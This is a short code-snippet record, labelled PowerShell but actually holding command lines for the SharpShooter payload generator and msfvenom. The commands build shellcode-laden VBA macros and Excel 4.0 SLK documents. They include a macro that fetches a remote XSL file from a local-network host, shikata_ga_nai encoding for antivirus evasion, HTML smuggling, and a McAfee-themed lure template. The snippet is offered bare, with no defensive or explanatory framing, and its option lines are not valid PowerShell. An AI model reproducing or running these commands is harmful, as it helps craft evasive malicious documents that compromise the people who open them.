---
id: ae75af55-2d33-4ee6-8aea-c492f5d73c0f
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:23.270258+00:00'
updated_at: '2023-04-10T20:36:58.379392+00:00'
---

# Code Snippet ae75af55

**Language**: Powershell

```powershell
# Options
-rawscfile <path>  Path to raw shellcode file for stageless payloads
--scfile <path>    Path to shellcode file as CSharp byte array

# Command 1: Create a stageless payload
python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test

# Command 2: Create a VBA Macro using XMLDOM COM interface
SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl

# Command 3: Create an Excel 4.0 SLK Macro Enabled Document
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\x00'
SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee

# Command 4: Create an Excel 4.0 SLK Macro Enabled Document with custom shellcode
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\x00'
SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
```
